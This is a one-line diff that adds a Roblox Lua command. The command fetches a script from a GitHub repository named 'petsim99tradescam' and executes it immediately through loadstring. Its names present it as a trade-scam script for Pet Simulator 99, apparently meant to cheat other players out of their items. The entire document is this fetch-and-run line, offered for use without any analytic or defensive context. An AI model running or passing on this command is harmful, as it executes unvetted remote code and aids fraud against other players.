@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ichessfleisch/petsim99tradescam/main/tradescamscript", true))()
